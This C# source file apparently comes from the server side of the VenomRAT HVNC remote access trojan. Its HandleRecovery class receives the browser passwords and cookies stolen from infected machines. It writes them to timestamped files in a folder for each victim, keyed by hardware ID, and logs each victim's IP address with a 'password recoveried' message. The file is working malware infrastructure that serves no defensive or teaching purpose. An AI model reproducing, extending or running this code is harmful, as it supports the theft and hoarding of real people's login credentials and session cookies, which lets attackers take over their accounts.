using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    public class HandleRecovery
    {
        public HandleRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
                string asString = unpack_msgpack.ForcePathObject("Logins").AsString;
                string asString2 = unpack_msgpack.ForcePathObject("Cookies").AsString;
                if (!string.IsNullOrWhiteSpace(asString) || !string.IsNullOrWhiteSpace(asString2))
                {
                    if (!Directory.Exists(text))
                    {
                        Directory.CreateDirectory(text);
                    }
                    File.WriteAllText(text + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString.Replace("\n", Environment.NewLine));
                    File.WriteAllText(text + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString2);
                    new HandleLogs().Addmsg(string.Concat(new string[]
                    {
                        "Client ",
                        client.Ip,
                        " password recoveried success，file located @ ClientsFolder \\ ",
                        unpack_msgpack.ForcePathObject("Hwid").AsString,
                        " \\ Recovery"
                    }), Color.Purple);
                }
                else
                {
                    new HandleLogs().Addmsg("Client " + client.Ip + " password recoveried error", Color.MediumPurple);
                }
                if (client != null)
                {
                    client.Disconnected();
                }
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}
